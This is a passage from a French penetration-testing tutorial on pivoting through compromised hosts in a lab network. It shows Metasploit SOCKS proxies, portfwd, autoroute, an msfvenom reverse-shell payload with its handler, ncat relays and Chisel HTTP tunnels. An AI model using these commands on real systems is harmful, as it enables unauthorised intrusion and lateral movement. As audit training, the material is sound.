					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">msf5 &gt; use auxiliary/server/socks4a</span><br><span style="color: #ffffff;">msf5 auxiliary(server/socks4a) &gt; show options</span><br><br><span style="color: #ffffff;">Module options (auxiliary/server/socks4a):</span><br><br><span style="color: #ffffff;">&nbsp;&nbsp; Name&nbsp;&nbsp;&nbsp;&nbsp; Current Setting&nbsp; Required&nbsp; Description</span><br><span style="color: #ffffff;">&nbsp;&nbsp; ----&nbsp;&nbsp;&nbsp;&nbsp; ---------------&nbsp; --------&nbsp; -----------</span><br><span style="color: #ffffff;">&nbsp;&nbsp; SRVHOST&nbsp; 0.0.0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The address to listen on</span><br><span style="color: #ffffff;">&nbsp;&nbsp; SRVPORT&nbsp; 1080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The port to listen on.</span><br><br><br><span style="color: #ffffff;">Auxiliary action:</span><br><br><span style="color: #ffffff;">&nbsp;&nbsp; Name&nbsp;&nbsp; Description</span><br><span style="color: #ffffff;">&nbsp;&nbsp; ----&nbsp;&nbsp; -----------</span><br><span style="color: #ffffff;">&nbsp;&nbsp; Proxy</span><br><br><br><span style="color: #ffffff;">msf5 auxiliary(server/socks4a) &gt; set SRVPORT 1081</span><br><span style="color: #ffffff;">SRVPORT =&gt; 1081</span><br><span style="color: #ffffff;">msf5 auxiliary(server/socks4a) &gt; run</span><br><span style="color: #ffffff;">[*] Auxiliary module running as background job 1.</span><br><span style="color: #ffffff;">msf5 auxiliary(server/socks4a) &gt;</span><br><span style="color: #ffffff;">[*] Starting the socks4a proxy server</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-cb91996 elementor-widget elementor-widget-text-editor" data-id="cb91996" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>PS : le module SOCKS5 semble ne pas fonctionner avec tous les outils.</p><p>Nous avons maintenant l’équivalent d’un SSH dynamic port forwarding.</p><p>Comme
 les précédentes fois, nous pouvons utiliser le serveur proxy avec nos 
outils. Nous reviendrons plus en détails sur l’utilisation d’outils en 
combinaison d’un proxy socks par la suite.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2134373 elementor-widget elementor-widget-text-editor" data-id="2134373" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2 --proxy socks4a://127.0.0.1:1081</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4c0a69d elementor-widget elementor-widget-text-editor" data-id="4c0a69d" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Au cas où 
nous aurions un outil qui ne supporterait pas d’être “proxifié”, nous 
pouvons toujours utiliser la commande meterpreter <span style="color: #ffffff; background-color: #474747; font-family: courier new;">portfwd</span> pour mettre en place un local port forwarding.</p><p>Pour cela, nous avons besoin de retourner sur notre session meterpreter.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2d1ef6f elementor-widget elementor-widget-text-editor" data-id="2d1ef6f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">msf5 &gt; sessions -i 1</span><br><span style="color: #ffffff;">meterpreter &gt; portfwd add -L 127.0.0.1 -l 23000 -r 10.42.42.2 -p 80</span><br><span style="color: #ffffff;">[*] Local TCP relay created: 127.0.0.1:23000 &lt;-&gt; 10.42.42.2:80</span><br><span style="color: #ffffff;">meterpreter &gt; portfwd list</span><br><br><span style="color: #ffffff;">Active Port Forwards</span><br><span style="color: #ffffff;">====================</span><br><br><span style="color: #ffffff;">&nbsp;&nbsp; Index&nbsp; Local&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Direction</span><br><span style="color: #ffffff;">&nbsp;&nbsp; -----&nbsp; -----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------</span><br><span style="color: #ffffff;">&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 127.0.0.1:23000&nbsp; 10.42.42.2:80&nbsp; Forward</span><br><br><span style="color: #ffffff;">1 total active port forwards.</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-807af2c elementor-widget elementor-widget-text-editor" data-id="807af2c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Parfait, nous pouvons vérifier le bon fonctionnement du local port forwarding <span style="color: #ffffff; background-color: #474747; font-family: courier new;">curl –head http://127.0.0.1:23000</span>.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0565613 elementor-widget elementor-widget-heading" data-id="0565613" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Metasploit - double pivoting</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-88f3294 elementor-widget elementor-widget-text-editor" data-id="88f3294" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Imaginons 
maintenant que nous avons trouvé une vulnérabilité sur le serveur Srv 
App 2, et que nous voulons nous en servir, elle aussi, comme d’un pivot 
pour voir s’il n’y a pas d’autres réseaux auxquels nous pourrions 
accéder.</p><p>Cette fois-ci, nous devons générer un reverse shell en 
mettant l’adresse du premier pivot (l’IP de l’interface du réseau 
distant) pour recevoir le shell.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f9b891a elementor-widget elementor-widget-text-editor" data-id="f9b891a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.42.42.1 LPORT=8088 -f exe --platform windows --arch x64 &gt; reverse.exe</span><br><span style="color: #ffffff;">No encoder or badchars specified, outputting raw payload</span><br><span style="color: #ffffff;">Payload size: 510 bytes</span><br><span style="color: #ffffff;">Final size of exe file: 7168 bytes</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b37549f elementor-widget elementor-widget-text-editor" data-id="b37549f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Utilisons une vulnérabilité fictive et exécutons le shell. Mais avant il nous faut bien sûr le handler en écoute sur le pivot.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0d05bf1 elementor-widget elementor-widget-text-editor" data-id="0d05bf1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; use exploit/multi/handler</span><br><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span style="color: #ffffff;">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; set LHOST 10.42.42.1</span><br><span style="color: #ffffff;">LHOST =&gt; 10.42.42.1</span><br><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; set LPORT 8088</span><br><span style="color: #ffffff;">LPORT =&gt; 8088</span><br><span style="color: #ffffff;">msf5 exploit(multi/handler) &gt; run</span><br><br><span style="color: #ffffff;">[*] Started reverse TCP handler on 10.42.42.1:8088 via the meterpreter on session 1</span><br><span style="color: #ffffff;">[*] Sending stage (206403 bytes) to ::ffff:10.42.42.2</span><br><span style="color: #ffffff;">[*] Meterpreter session 2 opened (192.168.2.149-192.168.2.105:8088 -&gt; ::ffff:10.42.42.2:49702) at 2019-08-29 20:28:38 +0200</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a61bc4d elementor-widget elementor-widget-text-editor" data-id="a61bc4d" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>On remarque <span style="color: #ffffff; background-color: #474747; font-family: courier new;">via the meterpreter on session 1</span>&nbsp;; metasploit a intelligemment déduit qu’il devait lancer le handler depuis notre session sur le pivot.</p><p>Maintenant nous avons un 2ème pivot qui, cette fois ci, est sous Windows.</p><p>Nous allons donc pouvoir utiliser le module <span style="color: #ffffff; background-color: #474747; font-family: courier new;">arp_scanner</span> depuis la nouvelle session meterpreter (session 2).</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2ad9b2e elementor-widget elementor-widget-text-editor" data-id="2ad9b2e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=10.42.42.0/24</span><br><br><span style="color: #ffffff;">[*] Running module against DESKTOP-PELL6GS</span><br><span style="color: #ffffff;">[*] ARP Scanning 10.42.42.0/24</span><br><span style="color: #ffffff;">[+]&nbsp;&nbsp;&nbsp;&nbsp; IP: 10.42.42.1 MAC 08:00:27:90:38:a3 (CADMUS COMPUTER SYSTEMS)</span><br><span style="color: #ffffff;">[+]&nbsp;&nbsp;&nbsp;&nbsp; IP: 10.42.42.2 MAC 08:00:27:f9:ac:cf (CADMUS COMPUTER SYSTEMS)</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a8f35c5 elementor-widget elementor-widget-text-editor" data-id="a8f35c5" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Ici Srv 
App 2 n’est pas connecté à un autre réseau que celui que nous 
connaissons déjà. Mais s’il en avait un autre, nous aurions pu scanner 
ce 2ème réseau distant, potentiellement détecter une 3ème machine 
vulnérable, l’exploiter et en faire un 3ème pivot, et ainsi de suite.</p><p>Si Srv App 2 était connecté à un autre réseau nous aurions aussi pu utiliser le module <span style="color: #ffffff; background-color: #474747; font-family: courier new;">autoroute</span> de nouveau pour accéder au second réseau distant via 2 rebonds. Imaginons le réseau 10.70.70.0.24, cela donnerait :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6ae056c elementor-widget elementor-widget-text-editor" data-id="6ae056c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set SESSION 2</span><br><span style="color: #ffffff;">SESSION =&gt; 2</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set CMD add</span><br><span style="color: #ffffff;">CMD =&gt; add</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set SUBNET 10.70.70.0</span><br><span style="color: #ffffff;">SUBNET =&gt; 10.70.70.0</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; set NETMASK /24</span><br><span style="color: #ffffff;">NETMASK =&gt; /24</span><br><span style="color: #ffffff;">msf5 post(multi/manage/autoroute) &gt; run</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4ad6a59 elementor-widget elementor-widget-text-editor" data-id="4ad6a59" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Ensuite nous aurions pu définir un deuxième proxy SOCKS pour atteindre le réseau 10.70.70.0/24.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-3566a10 elementor-widget elementor-widget-text-editor" data-id="3566a10" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">msf5 &gt; use auxiliary/server/socks4a</span><br><span style="color: #ffffff;">msf5 auxiliary(socks4a) &gt; set SRVPORT 1082</span><br><span style="color: #ffffff;">SRVPORT =&gt; 1082</span><br><span style="color: #ffffff;">msf5 auxiliary(socks4a) &gt; run</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4eb998b elementor-widget elementor-widget-heading" data-id="4eb998b" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Ncat - Reverse remote port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-b5fa6c1 elementor-widget elementor-widget-text-editor" data-id="b5fa6c1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Comme expliqué <a href="https://noraj.gitlab.io/the-hacking-trove/Tools/nc_ncat/">ici</a>, Ncat est à ne pas confondre avec Netcat qui fournit <span style="color: #ffffff; background-color: #474747; font-family: courier new;">nc</span>.
 Netcat est un simple utilitaire Unix qui permet de lire et écrire des 
données à travers TCP ou UDP, il est souvent utilisé pour créer des 
reverse ou bind shells. Cependant Ncat est une version largement 
améliorée de Netcat développée par l’équipe de Nmap. D’ailleurs, dans 
beaucoup de distributions Linux, <span style="color: #ffffff; background-color: #474747; font-family: courier new;">ncat</span> est souvent disponible dans le même package que <span style="color: #ffffff; background-color: #474747; font-family: courier new;">nmap</span> (ex : ArchLinux), alors que dans d’autres distributions <span style="color: #ffffff; background-color: #474747; font-family: courier new;">ncat</span>
 est disponible dans un package séparé (ex : OpenSUSE). Une mauvaise 
pratique courante est de laisser des outils de développement, de debug 
et d’analyse sur un serveur en production, il n’est donc pas rare de 
voir nmap ou tcpdump installés sur un serveur en production. Dans le cas
 où nmap est présent et que ncat est distribué avec, nous avons sous la 
main un outil très pratique pour ouvrir un shell dont nous allons aussi 
pouvoir nous servir pour pivoter. Pour en finir avec la description de 
ncat, les améliorations apportées par rapport à netcat sont par exemple :
 le chiffrement de la connexion, la restriction par IP, le chaînage, la 
redirection, la connexion à travers un proxy ou encore le support 
d’IPv6.</p><p>Pour utiliser <span style="color: #ffffff; background-color: #474747; font-family: courier new;">ncat</span>
 comme pivot, nous allons en avoir besoin sur la machine de l’auditeur 
mais aussi sur la machine pivot. Dans le cas où la machine pivot est un 
Windows, une version pré-compilée <span style="color: #ffffff; background-color: #474747; font-family: courier new;">ncat.exe</span> existe aussi.</p><p>Nous allons lancer un listener ncat sur la machine de l’auditeur en <a href="https://nmap.org/ncat/guide/ncat-broker.html">mode broker</a>, cela signifie qu’il va pouvoir accepter de recevoir plusieurs clients à la fois !</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-fdebcc3 elementor-widget elementor-widget-text-editor" data-id="fdebcc3" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ncat -lv --broker --max-conns 2</span><br><span style="color: #ffffff;">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span style="color: #ffffff;">Ncat: Listening on :::31337</span><br><span style="color: #ffffff;">Ncat: Listening on 0.0.0.0:31337</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-763a7cc elementor-widget elementor-widget-text-editor" data-id="763a7cc" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Puis, sur la machine pivot on va se connecter à la machine de l’auditeur et à la cible en même temps.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-bf11748 elementor-widget elementor-widget-text-editor" data-id="bf11748" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ncat -v 192.168.2.149 31337 -c 'ncat -v 10.42.42.2 80'</span><br><span style="color: #ffffff;">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span style="color: #ffffff;">Ncat: Connected to 192.168.2.149:31337</span><br><span style="color: #ffffff;">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span style="color: #ffffff;">Ncat: Connected to 10.42.42.2:80</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-03318e7 elementor-widget elementor-widget-text-editor" data-id="03318e7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Voilà, nous avons établi un reverse remote port forwarding avec <span style="color: #ffffff; background-color: #474747; font-family: courier new;">ncat</span>.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-94eb0ea elementor-widget elementor-widget-text-editor" data-id="94eb0ea" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://127.0.0.1:31337</span><br><span style="color: #ffffff;">HTTP/1.1 302 Found</span><br><span style="color: #ffffff;">Date: Tue, 03 Sep 2019 14:42:46 GMT</span><br><span style="color: #ffffff;">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.8</span><br><span style="color: #ffffff;">X-Powered-By: PHP/7.3.8</span><br><span style="color: #ffffff;">Location: http://127.0.0.1:31337/dashboard/</span><br><span style="color: #ffffff;">Content-Type: text/html; charset=UTF-8</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0a5e5c2 elementor-widget elementor-widget-text-editor" data-id="0a5e5c2" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Simple à mettre en place</li><li>Aucune ouverture de port sur le pivot</li><li>Nul besoin de serveur SSH</li><li>Nul besoin de connaître les login/mots de passe d’un utilisateur</li></ul><p><strong>Inconvénients : </strong></p><ul class="o-square-list"><li>Besoin d’être déployé sur la machine pivot</li><li>Ouverture port par port</li><li>Tunnel TCP</li></ul><p><strong>Note :</strong></p><p>Comme
 nous l’avons précédemment fait avec SSH, il serait possible de 
remplacer la connexion directe vers la cible par un serveur SOCKS, en 
appelant 3proxy dans l’option <span style="color: #ffffff; background-color: #474747; font-family: courier new;">-c</span> au lieu de <span style="color: #ffffff; background-color: #474747; font-family: courier new;">ncat</span>.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7088a26 elementor-widget elementor-widget-heading" data-id="7088a26" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Chisel - HTTP tunnel</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-e0a36f2 elementor-widget elementor-widget-text-editor" data-id="e0a36f2" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Chisel est disponible sur <a href="https://github.com/jpillora/chisel">GitHub</a>.</p><p>Chisel
 est un outil très puissant qui va encapsuler une session TCP dans un 
tunnel HTTP (un peu à la manière de Tunna ou reGeorg que nous verrons 
plus tard) tout en le sécurisant via SSH (dans le même style que 
sshuttle).</p><p>Chisel est un competitor-killer, il est facile à 
utiliser, performant. Toutes les communications sont chiffrées grâce à 
SSH, il supporte l’authentification mutuelle (login/mot de passe pour le
 client, correspondance du fingerpint pour le serveur), reconnexion 
automatique, et embarque son propre serveur proxy SOCKS 5.</p><p>En bref, nous pouvons faire tout ce que nous avons fait précédemment avec Chisel, et rien que lui.</p><p><strong>Note&nbsp;: </strong></p><p>Pour les exemples suivants, je ne m’étendrai pas sur les explications car nous les avons déjà vues à travers les scénarios SSH.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-bab684d elementor-widget elementor-widget-heading" data-id="bab684d" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Local port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-d4cfddd elementor-widget elementor-widget-text-editor" data-id="d4cfddd" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8af8007 elementor-widget elementor-widget-text-editor" data-id="8af8007" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ chisel server -p 8080 --host 192.168.2.105 -v</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e3c7d88 elementor-widget elementor-widget-text-editor" data-id="e3c7d88" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine de l’auditeur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b1d9cfd elementor-widget elementor-widget-text-editor" data-id="b1d9cfd" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:10.42.42.2:80</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2a4859f elementor-widget elementor-widget-text-editor" data-id="2a4859f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Vérification :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f4fa92b elementor-widget elementor-widget-text-editor" data-id="f4fa92b" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><span style="color: #ffffff;">$ curl –head http://127.0.0.1:33333</span></p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-36b375c elementor-widget elementor-widget-text-editor" data-id="36b375c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Simple à mettre en place</li><li>Nul besoin de serveur SSH</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Encapsulation HTTP</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Ouverture de port sur la machine pivot</li><li>Ouverture port par port</li><li>À déployer sur la machine pivot</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f3d6a29 elementor-widget elementor-widget-heading" data-id="f3d6a29" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Local port forwarding + SOCKS proxy</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-9f1179f elementor-widget elementor-widget-text-editor" data-id="9f1179f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2221210 elementor-widget elementor-widget-text-editor" data-id="2221210" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ chisel server -p 8080 --host 192.168.2.105 --socks5 -v</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e0ad001 elementor-widget elementor-widget-text-editor" data-id="e0ad001" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine de l’auditeur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-c79d895 elementor-widget elementor-widget-text-editor" data-id="c79d895" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:socks</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-64250b4 elementor-widget elementor-widget-text-editor" data-id="64250b4" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Vérification :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-95d491a elementor-widget elementor-widget-text-editor" data-id="95d491a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><span style="color: #ffffff;">$ curl –head http://10.42.42.2 –proxy socks5://127.0.0.1:33333</span></p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-64079af elementor-widget elementor-widget-text-editor" data-id="64079af" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Simple à mettre en place</li><li>Nul besoin de serveur SSH</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Encapsulation HTTP</li><li>Ouverture de port et cible dynamique</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Ouverture de port sur la machine pivot</li><li>À déployer sur la machine pivot</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-906c9fb elementor-widget elementor-widget-heading" data-id="906c9fb" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Reverse remote port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-1e11bb8 elementor-widget elementor-widget-text-editor" data-id="1e11bb8" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine de l’auditeur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ed23abc elementor-widget elementor-widget-text-editor" data-id="ed23abc" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ chisel server -p 8888 --host 192.168.2.149 --reverse -v</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a4e1348 elementor-widget elementor-widget-text-editor" data-id="a4e1348" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-708c751 elementor-widget elementor-widget-text-editor" data-id="708c751" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e58b780 elementor-widget elementor-widget-text-editor" data-id="e58b780" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Vérification :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4e664f1 elementor-widget elementor-widget-text-editor" data-id="4e664f1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://127.0.0.1:44444</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-09e92a9 elementor-widget elementor-widget-text-editor" data-id="09e92a9" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Simple à mettre en place</li><li>Nul besoin de serveur SSH</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Encapsulation HTTP</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Ouverture de port sur la machine pivot</li><li>Ouverture port par port</li><li>À déployer sur la machine pivot</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e83a232 elementor-widget elementor-widget-heading" data-id="e83a232" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Reverse remote port forwarding + proxy SOCKS (auto local port forwarding internal socks proxy)</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-6f6df96 elementor-widget elementor-widget-text-editor" data-id="6f6df96" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine de l’auditeur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ca1759a elementor-widget elementor-widget-text-editor" data-id="ca1759a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ chisel server -p 8888 --host 192.168.2.149 --reverse -v</span></pre></div>
				</div>
				</div>
